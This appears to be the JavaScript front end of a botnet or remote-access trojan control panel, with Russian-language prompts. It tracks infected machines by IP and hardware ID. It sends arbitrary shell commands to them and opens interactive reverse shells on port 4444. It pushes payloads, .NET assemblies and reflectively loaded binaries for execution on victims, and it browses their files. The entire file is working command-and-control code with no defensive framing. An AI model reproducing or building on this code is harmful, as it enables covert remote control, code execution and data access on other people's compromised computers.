const RSHELL_PORT = 4444;

const panel = io('/panel');
let shellSocket = null;

async function refreshBots() {
  const res = await fetch('/api/bots');
  const bots = await res.json();
  const tbody = document.querySelector('#bots tbody');
  tbody.innerHTML = '';
  bots.forEach(b => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${b.ip}</td>
      <td>${b.hwid}</td>
      <td>${b.lastSeen}</td>
      <td><button onclick="sendShell('${b.ip}')">Shell</button></td>
      <td><button onclick="connectShell('${b.ip}')">Connect Shell</button></td>
      <td><button onclick="toggleBan('${b.ip}')">Ban/Unban</button></td>
    `;
    tbody.appendChild(tr);
  });
}

function sendShell(ip) {
  const cmd = prompt(`Введите команду для ${ip}:`);
  if (!cmd) return;
  panel.emit('shell', { ip, cmd });
}

function connectShell(ip) {
  if (shellSocket) closeShell();
  document.getElementById('terminal').style.display = 'block';
  document.getElementById('term-ip').textContent = ip;
  const url = `ws://${ip}:${RSHELL_PORT}`;
  shellSocket = new WebSocket(url);
  shellSocket.binaryType = 'arraybuffer';

  shellSocket.onmessage = ev => {
    const out = new TextDecoder().decode(ev.data);
    const pre = document.getElementById('term-output');
    pre.textContent += out;
    pre.scrollTop = pre.scrollHeight;
  };
  shellSocket.onclose = () => { shellSocket = null; };

  const input = document.getElementById('term-input');
  input.focus();
  input.addEventListener('keydown', e => {
    if (e.key === 'Enter' && shellSocket && shellSocket.readyState === 1) {
      const line = input.value + '\n';
      shellSocket.send(line);
      input.value = '';
    }
  });
}

function closeShell() {
  if (shellSocket) shellSocket.close();
  shellSocket = null;
  document.getElementById('terminal').style.display = 'none';
  document.getElementById('term-output').textContent = '';
  document.getElementById('term-input').value = '';
}

async function toggleBan(key) {
  const verb = confirm(`Забанить ${key}?`) ? 'ban' : 'unban';
  await fetch(`/api/${verb}`, {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ key })
  });
  refreshBots();
}

function Base64File(file, cb) {
  const r = new FileReader();
  r.onload = () => cb(Array.from(new Uint8Array(r.result)));
  r.readAsArrayBuffer(file);
}

function sendPayload() {
  const ip   = document.getElementById('payload-ip').value.trim();
  const file = document.getElementById('payload-file').files[0];
  if (!ip || !file) return alert('Укажите IP и файл');
  Base64File(file, data => panel.emit('payload', { ip, data }));
}

function sendDotnet() {
  const ip   = document.getElementById('dotnet-ip').value.trim();
  const file = document.getElementById('dotnet-file').files[0];
  if (!ip || !file) return alert('Укажите IP и файл');
  Base64File(file, data => panel.emit('load_dotnet', { ip, data }));
}

function sendReflective() {
  const ip   = document.getElementById('reflective-ip').value.trim();
  const file = document.getElementById('reflective-file').files[0];
  if (!ip || !file) return alert('Укажите IP и файл');
  Base64File(file, data => panel.emit('exec_reflective', { ip, data }));
}

panel.on('shell_output', ({ ip, output }) => {
  alert(`Shell output from ${ip}:\n${output}`);
});
panel.on('payload_status', ({ ip, status }) => {
  document.getElementById('payload-status').textContent =
    `Payload status from ${ip}: ${status}`;
});

async function listFiles() {
  const dir = document.getElementById('fm-path').value.trim();
  const res = await fetch(`/api/files?path=${encodeURIComponent(dir)}`);
  if (!res.ok) {
    alert('Ошибка: ' + await res.text());
    return;
  }
  const { list } = await res.json();
  const ul = document.getElementById('files');
  ul.innerHTML = '';
  list.forEach(e => {
    const li = document.createElement('li');
    li.textContent = e.name;
    if (e.isDirectory) li.style.fontWeight = 'bold';
    ul.appendChild(li);
  });
}

refreshBots();
setInterval(refreshBots, 5000);
